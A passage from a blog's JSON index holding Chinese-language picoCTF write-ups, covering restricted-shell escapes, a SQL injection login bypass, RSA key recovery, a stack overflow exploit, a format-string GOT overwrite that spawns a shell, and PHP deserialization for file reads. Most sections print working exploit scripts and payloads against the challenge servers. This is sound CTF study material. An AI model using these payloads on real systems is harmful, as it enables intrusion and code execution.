這一題沒有寫出來，太難了，應該說複雜很多，即使看了maple和martin的WP還是做不出來，大概知道就是兩個list之間的XOR，不過具體的流程和解題思路是比較模糊的，沒有通透的感覺QQ\nReference # pico web wp - Some Assembly Required 3 - maple picoCTF 2021 Some Assembly Required 3 - Martin\n"},{"id":321,"href":"/security/practice/picoctf/general-skills/picoctf---special--specialer/","title":"PicoCTF - Special \u0026 Specialer","section":"Securities","content":" PicoCTF - Special \u0026amp; Specialer # tags: PicoCTF CTF General Skill # Recon # 這兩題都蠻有趣的，感覺打提權應該會用到，所以一起紀錄，第一題是要get shell，關於這一題我是直接看學長之前解題的WP，payload是${0}就直接拿到shell了，詳細的原理我也不清楚，第二題比較簡單，就直接用網路的資源替換一下ls, cat這兩個指令就拿到flag了\nExploit # 代替cat的方法：\n# Method 1 $ while read line; do while\u0026gt; echo $line; while\u0026gt; done \u0026lt;{filename}} # Method 2 $ exec 3\u0026lt;{filename}} # Assign file descriptor 3 for reading $ while read -u 3 line; do while\u0026gt; echo $line while\u0026gt; done # Method 3 $ echo \u0026#34;$(\u0026lt;{filename})\u0026#34; 代替ls的方法\n# Method 1 $ echo * # Method 2 $ echo */* # Method 3 $ echo * .* # Method 4 $ dir # Method 5 $ printf \u0026#39;%s\\n\u0026#39; * # Method 6 $ grep -l \u0026#39;.*\u0026#39; ./* # Method 7 $ find . # Method 8 $ stat -c \u0026#39;%s %A %n\u0026#39; * # Method 9 $ lsattr ./* # Method 10 $ vim . Reference # Cat without cat on the commandline Alternatives to the \u0026rsquo;ls\u0026rsquo; command to list the contents of a directory\n"},{"id":322,"href":"/security/practice/picoctf/web/picoctf---sqlilite/","title":"PicoCTF - SQLiLite","section":"Securities","content":" PicoCTF - SQLiLite # tags: PicoCTF CTF Web # Challenge: http://saturn.picoctf.net:55837/\nExploit - sqli # Payload: admin' or '1'='1' -- # "},{"id":323,"href":"/security/practice/picoctf/crypto/rsa/picoctf---sra/","title":"PicoCTF - SRA","section":"Securities","content":" PicoCTF - SRA # tags: PicoCTF CTF Crypto # Source code # :::spoiler Source Code\nfrom Crypto.Util.number import getPrime, inverse, bytes_to_long from string import ascii_letters, digits from random import choice pride = \u0026#34;\u0026#34;.join(choice(ascii_letters + digits) for _ in range(16)) gluttony = getPrime(128) greed = getPrime(128) lust = gluttony * greed sloth = 65537 envy = inverse(sloth, (gluttony - 1) * (greed - 1)) anger = pow(bytes_to_long(pride.encode()), sloth, lust) print(f\u0026#34;{anger = }\u0026#34;) print(f\u0026#34;{envy = }\u0026#34;) print(\u0026#34;vainglory?\u0026#34;) vainglory = input(\u0026#34;\u0026gt; \u0026#34;).strip() if vainglory == pride: print(\u0026#34;Conquered!\u0026#34;) with open(\u0026#34;/challenge/flag.txt\u0026#34;) as f: print(f.read()) else: print(\u0026#34;Hubris!\u0026#34;) :::\nRecon # 這一題也蠻有趣的，有給$e, d, c$，而我們知道$ed\\equiv 1\\ (mod\\ \\phi(n))$但目前不知道$n$是多少，這也是這一題比較難的地方，不過仔細看$p, q$的bits range只有128 bits，感覺有機會可以爆破，試想: $$ ed-1=\\phi(n) * k=(p-1)(q-1)*k $$ 所以我們只要先用online tool，分析所有的質因數，再暴力破解看可能的$p$有多少就可以了 :::spoiler Screenshot :::\nExploit # Note: 使用以下的script，需要利用這個online tool，然後把結果以逗號分開，再用list的方式當作input, e.g. [2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 5, 7, 17, 19, 151, 2363909, 75519055285493, 6681450981644264152589, 118264780684392418025651473217] Note2: 我寫的script沒辦法處理候選的$p$有三個以上的情況，因為我懶得寫，所以它會自動斷線再重新連線重新計算一次，以我的經驗大約3-4次就可以拿到flag了 from pwn import * from itertools import combinations from Crypto.Util.number import isPrime, inverse, long_to_bytes context.arch = \u0026#39;amd64\u0026#39; # 這個寫法超屌，要學起來，來自Martin Carlisle大大 def sub_lists (l): comb = [] for i in range(1,len(l)+1): comb += [list(j) for j in combinations(l, i)] return comb def main(): r = remote(\u0026#34;saturn.picoctf.net\u0026#34;, 64350) c = int(r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1]) d = int(r.recvline().strip().decode().split(\u0026#34; \u0026#34;)[-1]) e = 65537 log.info(f\u0026#34;c = {c}\\nd = {d}\u0026#34;) k_phi = d * e - 1 print(\u0026#34;k_phi = \u0026#34;, k_phi) k_phi_factor = eval(input()) combos = sub_lists(k_phi_factor) \u0026#39;\u0026#39;\u0026#39;Find (p-1)\u0026#39;\u0026#39;\u0026#39; primes = set() for l in combos: product = 1 # multiply them together to get p-1 for k in l: product = product * k if product.bit_length()==128 and isPrime(product+1): primes.add(product+1) print(primes) if len(primes) == 2: phi = 1 n = 1 for candidate in primes: phi *= (candidate - 1) n *= candidate assert inverse(e, phi) == d print(long_to_bytes(pow(c, d, n))) r.sendline(long_to_bytes(pow(c, d, n))) r.interactive() r.close() sys.exit(0) else: r.close() return False if __name__ == \u0026#39;__main__\u0026#39;: while not main(): main() Flag: picoCTF{7h053_51n5_4r3_n0_m0r3_2b7ad1ae}\nReference # picoCTF 2023 SRA PicoCTF: SRA Challenge maple3142 - SRA\n"},{"id":324,"href":"/security/practice/picoctf/pwn/picoctf---stack-cache/","title":"PicoCTF - stack cache","section":"Securities","content":" PicoCTF - stack cache # Background # BoF\nSource code # :::spoiler\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;wchar.h\u0026gt; #include \u0026lt;locale.h\u0026gt; #define BUFSIZE 16 #define FLAGSIZE 64 #define INPSIZE 10 /* This program is compiled statically with clang-12 without any optimisations. */ void win() { char buf[FLAGSIZE]; char filler[BUFSIZE]; FILE *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == NULL) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;Please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,FLAGSIZE,f); // size bound read } void UnderConstruction() { // this function is under construction char consideration[BUFSIZE]; char *demographic, *location, *identification, *session, *votes, *dependents; char *p,*q, *r; // *p = \u0026#34;Enter names\u0026#34;; // *q = \u0026#34;Name 1\u0026#34;; // *r = \u0026#34;Name 2\u0026#34;; unsigned long *age; printf(\u0026#34;User information : %p %p %p %p %p %p\\n\u0026#34;,demographic, location, identification, session, votes, dependents); printf(\u0026#34;Names of user: %p %p %p\\n\u0026#34;, p,q,r); printf(\u0026#34;Age of user: %p\\n\u0026#34;,age); fflush(stdout); } void vuln(){ char buf[INPSIZE]; printf(\u0026#34;Give me a string that gets you the flag\\n\u0026#34;); gets(buf); printf(\u0026#34;%s\\n\u0026#34;,buf); return; } int main(int argc, char **argv){ setvbuf(stdout, NULL, _IONBF, 0); // Set the gid to the effective gid // this prevents /bin/sh from dropping the privileges gid_t gid = getegid(); setresgid(gid, gid, gid); vuln(); printf(\u0026#34;Bye!\u0026#34;); return 0; } :::\nRecon # 這一題也蠻簡單的，不過也是比較少人解，可以看到他有讀取flag的win function和print出stack value的UnderConstruction function，重點是win function只有讀取flag沒有print出來，所以直接跳rip到win function後再跳到UnderConstruction function就可以print出flag的資訊\nExploit # from pwn import * # r = process(\u0026#34;./vuln\u0026#34;) r = remote(\u0026#39;saturn.picoctf.net\u0026#39;, 60896) r.recvline() # raw_input() win_addr = 0x8049d90 UnderConstruction_addr = 0x8049e10 r.sendline(b\u0026#39;a\u0026#39; * 14 + p32(win_addr) + p32(UnderConstruction_addr) ) r.recvuntil(b\u0026#39;: \u0026#39;) flag = r.recvline().strip().decode() r.recvuntil(b\u0026#34;:\u0026#34;) flag += (\u0026#34; \u0026#34; + r.recvline().strip().decode()) r.recvuntil(b\u0026#34;:\u0026#34;) flag += (\u0026#34; \u0026#34; + r.recvline().strip().decode()) success(flag) flag = flag.split(\u0026#39; \u0026#39;) FLAG = \u0026#34;\u0026#34; for i in range(len(flag)): FLAG += flag[i][2:] success(\u0026#34;Flag = {}\u0026#34;.format(bytes.fromhex(FLAG).decode(\u0026#39;cp437\u0026#39;)[::-1])) r.interactive() Flag: picoCTF{Cle4N_uP_M3m0rY_b4f3c84e}\n"},{"id":325,"href":"/security/practice/picoctf/pwn/picoctf---stonk-market/","title":"PicoCTF - Stonk Market","section":"Securities","content":" PicoCTF - Stonk Market # Background # FMT\nSource code # :::spoiler\n#include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;time.h\u0026gt; #define FLAG_BUFFER 128 #define MAX_SYM_LEN 4 typedef struct Stonks { int shares; char symbol[MAX_SYM_LEN + 1]; struct Stonks *next; } Stonk; typedef struct Portfolios { int money; Stonk *head; } Portfolio; int view_portfolio(Portfolio *p) { if (!p) { return 1; } printf(\u0026#34;\\nPortfolio as of \u0026#34;); fflush(stdout); system(\u0026#34;date\u0026#34;); // TODO: implement this in C fflush(stdout); printf(\u0026#34;\\n\\n\u0026#34;); Stonk *head = p-\u0026gt;head; if (!head) { printf(\u0026#34;You don\u0026#39;t own any stonks!\\n\u0026#34;); } while (head) { printf(\u0026#34;%d shares of %s\\n\u0026#34;, head-\u0026gt;shares, head-\u0026gt;symbol); head = head-\u0026gt;next; } return 0; } Stonk *pick_symbol_with_AI(int shares) { if (shares \u0026lt; 1) { return NULL; } Stonk *stonk = malloc(sizeof(Stonk)); stonk-\u0026gt;shares = shares; int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1; for (int i = 0; i \u0026lt;= MAX_SYM_LEN; i++) { if (i \u0026lt; AI_symbol_len) { stonk-\u0026gt;symbol[i] = \u0026#39;A\u0026#39; + (rand() % 26); } else { stonk-\u0026gt;symbol[i] = \u0026#39;\\0\u0026#39;; } } stonk-\u0026gt;next = NULL; return stonk; } int buy_stonks(Portfolio *p) { if (!p) { return 1; } /* char api_buf[FLAG_BUFFER]; FILE *f = fopen(\u0026#34;api\u0026#34;,\u0026#34;r\u0026#34;); if (!f) { printf(\u0026#34;Flag file not found\\n\u0026#34;); exit(1); } fgets(api_buf, FLAG_BUFFER, f); */ int money = p-\u0026gt;money; int shares = 0; Stonk *temp = NULL; printf(\u0026#34;Using patented AI algorithms to buy stonks\\n\u0026#34;); while (money \u0026gt; 0) { shares = (rand() % money) + 1; temp = pick_symbol_with_AI(shares); temp-\u0026gt;next = p-\u0026gt;head; p-\u0026gt;head = temp; money -= shares; } printf(\u0026#34;Stonks chosen\\n\u0026#34;); char *user_buf = malloc(300 + 1); printf(\u0026#34;What is your API token?\\n\u0026#34;); scanf(\u0026#34;%300s\u0026#34;, user_buf); printf(\u0026#34;Buying stonks with token:\\n\u0026#34;); printf(user_buf); // TODO: Actually use key to interact with API view_portfolio(p); return 0; } Portfolio *initialize_portfolio() { Portfolio *p = malloc(sizeof(Portfolio)); p-\u0026gt;money = (rand() % 2018) + 1; p-\u0026gt;head = NULL; return p; } void free_portfolio(Portfolio *p) { Stonk *current = p-\u0026gt;head; Stonk *next = NULL; while (current) { next = current-\u0026gt;next; free(current); current = next; } free(p); } int main(int argc, char *argv[]) { setbuf(stdout, NULL); srand(time(NULL)); Portfolio *p = initialize_portfolio(); if (!p) { printf(\u0026#34;Memory failure\\n\u0026#34;); exit(1); } int resp = 0; printf(\u0026#34;Welcome back to the trading app!\\n\\n\u0026#34;); printf(\u0026#34;What would you like to do?\\n\u0026#34;); printf(\u0026#34;1) Buy some stonks!\\n\u0026#34;); printf(\u0026#34;2) View my portfolio\\n\u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;resp); if (resp == 1) { buy_stonks(p); } else if (resp == 2) { view_portfolio(p); } free_portfolio(p); printf(\u0026#34;Goodbye!\\n\u0026#34;); exit(0); } :::\nRecon # 這一題是參考了1，可以看到source code中的buy_stonks function出現format string bug，我一開始看了很久，以為這一題是和heap有關的問題\n1的做法是： 先把free的got address(0x602018)利用fmt寫到某一個位置，然後再改變got指向的位置(0x4006c6)，變成指向system的位置(0x4006f0)，再把sh\\x00的string寫到某一個chunk中，之後當call到free並且要free掉我們指定的那個chunk時，他就會執行system(sh\\x00)，成功執行shell\nAnalysis # 當程式執行到\u0026lt;printf_positional+7716\u0026gt; mov BYTE PTR [rax], bl(如下)時，可以看一下rax數值在register中應對不同payload時的變化，我把完整的trace stack放在這一段的最下面，有興趣trace的人可以參考一下\n0x7ffff7e40bb4 \u0026lt;printf_positional+7700\u0026gt; test r12d, r12d 0x7ffff7e40bb7 \u0026lt;printf_positional+7703\u0026gt; je 0x7ffff7e40f1e \u0026lt;printf_positional+8574\u0026gt; 0x7ffff7e40bbd \u0026lt;printf_positional+7709\u0026gt; movzx ebx, BYTE PTR [rbp-0x8a4] → 0x7ffff7e40bc4 \u0026lt;printf_positional+7716\u0026gt; mov BYTE PTR [rax], bl 0x7ffff7e40bc6 \u0026lt;printf_positional+7718\u0026gt; jmp 0x7ffff7e3fa29 \u0026lt;printf_positional+3209\u0026gt; 0x7ffff7e40bcb \u0026lt;printf_positional+7723\u0026gt; mov r10d, DWORD PTR [rbx+rax*1] 0x7ffff7e40bcf \u0026lt;printf_positional+7727\u0026gt; test r12d, r12d 0x7ffff7e40bd2 \u0026lt;printf_positional+7730\u0026gt; je 0x7ffff7e40f34 \u0026lt;printf_positional+8596\u0026gt; 0x7ffff7e40bd8 \u0026lt;printf_positional+7736\u0026gt; movsx r10, r10b ==Incorrect Payload:== %6299672c%12$n%216c%20$hhn%10504067c%10$n遇到的問題 :::spoiler Register $rdi : 0x0 $rax : 0x0 $r8 : 0xffffffff $rbx : 0xf0 $rcx : 0x00007ffff7f78f40 → 0x0000000000000000 $r13 : 0x0 $r10 : 0x00007fffffffa580 → 0x00000000f7fb8723 $r12 : 0x1 $r14 : 0x00007fffffffa248 → 0x00000000ffffffff $r9 : 0x0 $rbp : 0x00007fffffffa9d0 → 0x00007fffffffaf90 → 0x00007fffffffd670 $rip : 0x00007ffff7e40bc4 → \u0026lt;printf_positional+7716\u0026gt; mov BYTE PTR [rax], bl $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $rdx : 0x00007ffff7e3f42a → \u0026lt;printf_positional+1674\u0026gt; endbr64 $r15 : 0x00007fffffffafc0 → 0x00000000fbad8004 $rsi : 0x00007fffffffa580 → 0x00000000f7fb8723 $r11 : 0x6e $rsp : 0x00007fffffffa060 → 0x0000000000000000 $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00 ::: ==Correct Payload:== %c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n :::spoiler Register $rdi : 0x0 $rax : 0x0000000000602018 → 0x00000000004006c6 → 0xffe0e90000000068 (\u0026#34;h\u0026#34;?) $r8 : 0xffffffff $rbx : 0xf0 $rcx : 0x00007ffff7f78f40 → 0x0000000000000000 $r13 : 0x0 $r10 : 0x00007fffffffa580 → 0x00000000f7fb8723 $r12 : 0x1 $r14 : 0x0000000000603cf8 → 0x00000000ffffffff $r9 : 0x0 $rbp : 0x00007fffffffa9d0 → 0x00007fffffffaf90 → 0x00007fffffffd670 $rip : 0x00007ffff7e40bc4 → \u0026lt;printf_positional+7716\u0026gt; mov BYTE PTR [rax], bl $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification] $rdx : 0x00007ffff7e3f42a → \u0026lt;printf_positional+1674\u0026gt; endbr64 $r15 : 0x00007fffffffafc0 → 0x00000000fbad8004 $rsi : 0x00007fffffffa580 → 0x00000000f7fb8723 $r11 : 0x6e $rsp : 0x00007fffffffa060 → 0x0000000000000000 $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00 ::: 可以看到0x7ffff7e40bc4 mov BYTE PTR [rax], bl準備把0xf0的值放到rax指向的位置，但是如果是第一種payload，rax的value是0，而第二種payload所存放的value才是0x602018，所以這應該就是@ccccctw所提到的問題，一開始把0x602018寫入0x00007fffffffd7d0之前都還是零，所以第二種payload因為某種關係，他可以先把0x602018寫入0x00007fffffffd7d0，==再==把0x602018指向的0x4006c6最後一個byte改掉，而不是像第一種payload一樣，是同時執行所有的動作，導致系統還沒有把0x602018寫入0x00007fffffffd7d0，想當然0x00007fffffffd7d0的value也是零 ... 0x00007fffffffd790│+0x0030: 0x00007fffffffd7d0 → 0x0000000000000000 ← $rbp ... 0x00007fffffffd7d0│+0x0070: 0x0000000000000000 :::spoiler 完整的trace stack\ngef➤ bt 10 #0 0x00007ffff7e40bc4 in printf_positional (s=s@entry=0x7fffffffafc0, format=format@entry=0x603730 \u0026#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n\u0026#34;, readonly_format=readonly_format@entry=0x0, ap=ap@entry=0x7fffffffd680, ap_savep=ap_savep@entry=0x7fffffffab48, done=\u0026lt;optimized out\u0026gt;, nspecs_done=\u0026lt;optimized out\u0026gt;, lead_str_end=\u0026lt;optimized out\u0026gt;, work_buffer=\u0026lt;optimized out\u0026gt;, save_errno=\u0026lt;optimized out\u0026gt;, grouping=\u0026lt;optimized out\u0026gt;, thousands_sep=\u0026lt;optimized out\u0026gt;, mode_flags=\u0026lt;optimized out\u0026gt;) at vfprintf-internal.c:2072 #1 0x00007ffff7e41dcd in __vfprintf_internal (s=s@entry=0x7fffffffafc0, format=0x603730 \u0026#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n\u0026#34;, ap=0x7fffffffd680, mode_flags=\u0026lt;optimized out\u0026gt;) at vfprintf-internal.c:1733 #2 0x00007ffff7e44ea2 in buffered_vfprintf (s=s@entry=0x7ffff7fb86a0 \u0026lt;_IO_2_1_stdout_\u0026gt;, format=format@entry=0x603730 \u0026#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n\u0026#34;, args=args@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:2377 #3 0x00007ffff7e41d24 in __vfprintf_internal (s=0x7ffff7fb86a0 \u0026lt;_IO_2_1_stdout_\u0026gt;, format=0x603730 \u0026#34;%6299672c%12$n%216c%20$hhn%10504067c%10$n\u0026#34;, ap=ap@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:1346 #4 0x00007ffff7e2cd3f in __printf (format=\u0026lt;optimized out\u0026gt;) at printf.c:33 #5 0x0000000000400ace in buy_stonks () #6 0x0000000000400c66 in main () :::\nExploit - FMT # from pwn import * if args.LOCAL: r = process(\u0026#39;./vuln\u0026#39;) else: r = remote(\u0026#39;mercury.picoctf.net\u0026#39;, 5654) payload = \u0026#39;%c\u0026#39;*10 + \u0026#39;%6299662c\u0026#39; + \u0026#39;%n\u0026#39; + \u0026#39;%216c\u0026#39; + \u0026#39;%20$hhn\u0026#39; + \u0026#39;%10504067c\u0026#39; + \u0026#39;%10$n\u0026#39; r.sendline(b\u0026#39;1\u0026#39;) raw_input() r.sendlineafter(b\u0026#34;token?\u0026#34;, payload.encode()) r.interactive() Flag: picoCTF{explo1t_m1t1gashuns_641dcdf1}\nReference # picoCTF 2021 Stonk Market \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":326,"href":"/security/practice/picoctf/web/picoctf---super-serial/","title":"PicoCTF - Super Serial","section":"Securities","content":" PicoCTF - Super Serial # tags: PicoCTF CTF Web # Background # php unserialization\nHint # The flag is at ../flag Recon # 這一題設了太多套路了，但從題目的Title可以猜到應該要用不安全的反序列化\nrobot.txt 一開始會從這邊開始著手就是因為假的source code啥都沒有，本來也以為是sqli，但也沒收穫，看了WP才知道要從這邊開始，可以看到以下訊息，但副檔名居然不是一般的php而是phps(而且/admin.phps沒有任何東西)，可見php是個幌子，則前面的source code就要重新分析 index.phps 用index.phps查看source code發現有一些其他怪東西，包括authentication.phps和cookie.php :::spoiler Real Source Code\n\u0026lt;?php require_once(\u0026#34;cookie.php\u0026#34;); if(isset($_POST[\u0026#34;user\u0026#34;]) \u0026amp;\u0026amp; isset($_POST[\u0026#34;pass\u0026#34;])){ $con = new SQLite3(\u0026#34;../users.db\u0026#34;); $username = $_POST[\u0026#34;user\u0026#34;]; $password = $_POST[\u0026#34;pass\u0026#34;]; $perm_res = new permissions($username, $password); if ($perm_res-\u0026gt;is_guest() || $perm_res-\u0026gt;is_admin()) { setcookie(\u0026#34;login\u0026#34;, urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), \u0026#34;/\u0026#34;); header(\u0026#34;Location: authentication.php\u0026#34;); die(); } else { $msg = \u0026#39;\u0026lt;h6 class=\u0026#34;text-center\u0026#34; style=\u0026#34;color:red\u0026#34;\u0026gt;Invalid Login.\u0026lt;/h6\u0026gt;\u0026#39;; } } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;style.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-sm-9 col-md-7 col-lg-5 mx-auto\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card card-signin my-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;card-title text-center\u0026#34;\u0026gt;Sign In\u0026lt;/h5\u0026gt; \u0026lt;?php if (isset($msg)) echo $msg; ?\u0026gt; \u0026lt;form class=\u0026#34;form-signin\u0026#34; action=\u0026#34;index.php\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-label-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;user\u0026#34; name=\u0026#34;user\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Username\u0026#34; required autofocus\u0026gt; \u0026lt;label for=\u0026#34;user\u0026#34;\u0026gt;Username\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-label-group\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;pass\u0026#34; name=\u0026#34;pass\u0026#34; class=\u0026#34;form-control\u0026#34; placeholder=\u0026#34;Password\u0026#34; required\u0026gt; \u0026lt;label for=\u0026#34;pass\u0026#34;\u0026gt;Password\u0026lt;/label\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button class=\u0026#34;btn btn-lg btn-primary btn-block text-uppercase\u0026#34; type=\u0026#34;submit\u0026#34;\u0026gt;Sign in\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\nauthentication.phps :::spoiler Real Source Code\n\u0026lt;?php class access_log { public $log_file; function __construct($lf) { $this-\u0026gt;log_file = $lf; } function __toString() { return $this-\u0026gt;read_log(); } function append_to_log($data) { file_put_contents($this-\u0026gt;log_file, $data, FILE_APPEND); } function read_log() { return file_get_contents($this-\u0026gt;log_file); } } require_once(\u0026#34;cookie.php\u0026#34;); if(isset($perm) \u0026amp;\u0026amp; $perm-\u0026gt;is_admin()){ $msg = \u0026#34;Welcome admin\u0026#34;; $log = new access_log(\u0026#34;access.log\u0026#34;); $log-\u0026gt;append_to_log(\u0026#34;Logged in at \u0026#34;.date(\u0026#34;Y-m-d\u0026#34;).\u0026#34;\\n\u0026#34;); } else { $msg = \u0026#34;Welcome guest\u0026#34;; } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;link href=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34; integrity=\u0026#34;sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;style.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-sm-9 col-md-7 col-lg-5 mx-auto\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card card-signin my-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h5 class=\u0026#34;card-title text-center\u0026#34;\u0026gt;\u0026lt;?php echo $msg; ?\u0026gt;\u0026lt;/h5\u0026gt; \u0026lt;form action=\u0026#34;index.php\u0026#34; method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;button class=\u0026#34;btn btn-lg btn-primary btn-block text-uppercase\u0026#34; type=\u0026#34;submit\u0026#34; onclick=\u0026#34;document.cookie=\u0026#39;user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;\u0026#39;\u0026#34;\u0026gt;Go back to login\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; :::\ncookie.phps :::spoiler Real Source Code\n\u0026lt;?php session_start(); class permissions { public $username; public $password; function __construct($u, $p) { $this-\u0026gt;username = $u; $this-\u0026gt;password = $p; } function __toString() { return $u.$p; } function is_guest() { $guest = false; $con = new SQLite3(\u0026#34;../users.db\u0026#34;); $username = $this-\u0026gt;username; $password = $this-\u0026gt;password; $stm = $con-\u0026gt;prepare(\u0026#34;SELECT admin, username FROM users WHERE username=? AND password=?\u0026#34;); $stm-\u0026gt;bindValue(1, $username, SQLITE3_TEXT); $stm-\u0026gt;bindValue(2, $password, SQLITE3_TEXT); $res = $stm-\u0026gt;execute(); $rest = $res-\u0026gt;fetchArray(); if($rest[\u0026#34;username\u0026#34;]) { if ($rest[\u0026#34;admin\u0026#34;] != 1) { $guest = true; } } return $guest; } function is_admin() { $admin = false; $con = new SQLite3(\u0026#34;../users.db\u0026#34;); $username = $this-\u0026gt;username; $password = $this-\u0026gt;password; $stm = $con-\u0026gt;prepare(\u0026#34;SELECT admin, username FROM users WHERE username=? AND password=?\u0026#34;); $stm-\u0026gt;bindValue(1, $username, SQLITE3_TEXT); $stm-\u0026gt;bindValue(2, $password, SQLITE3_TEXT); $res = $stm-\u0026gt;execute(); $rest = $res-\u0026gt;fetchArray(); if($rest[\u0026#34;username\u0026#34;]) { if ($rest[\u0026#34;admin\u0026#34;] == 1) { $admin = true; } } return $admin; } } if(isset($_COOKIE[\u0026#34;login\u0026#34;])){ try{ $perm = unserialize(base64_decode(urldecode($_COOKIE[\u0026#34;login\u0026#34;]))); $g = $perm-\u0026gt;is_guest(); $a = $perm-\u0026gt;is_admin(); } catch(Error $e){ die(\u0026#34;Deserialization error. \u0026#34;.$perm); } } ?\u0026gt; ::: 這一題的直覺是用不安全的反序列化達到LFI或是RCE，問題是要利用哪一個class，可以看到這幾個file中只有authentication.phps中的access_log和cookie.phps中的permission，而考慮到hint提到flag的相對位置，代表應該可以確定是LFI的思路，則我們可以找有讀取file的class也就是access_log，另外authentication.phps也能單獨access，剩下的事情就簡單了，就construct一個exploit payload然後按照decode的順序反著做一次就可以了\nNote: 我再講詳細一點好了，不管是index.phps或是authentication.phps都會在一開始require cookie.php，代表他會執行以下這段程式，並且進行反序列化，而會用到LFI的class method是在authentication.phps中，所以我們要訪問的網頁應該是這個，然後要創建login cookie是因為cookie.phps需要這個東西才會進入判斷式\nif(isset($_COOKIE[\u0026#34;login\u0026#34;])){ try{ $perm = unserialize(base64_decode(urldecode($_COOKIE[\u0026#34;login\u0026#34;]))); $g = $perm-\u0026gt;is_guest(); $a = $perm-\u0026gt;is_admin(); } catch(Error $e){ die(\u0026#34;Deserialization error. 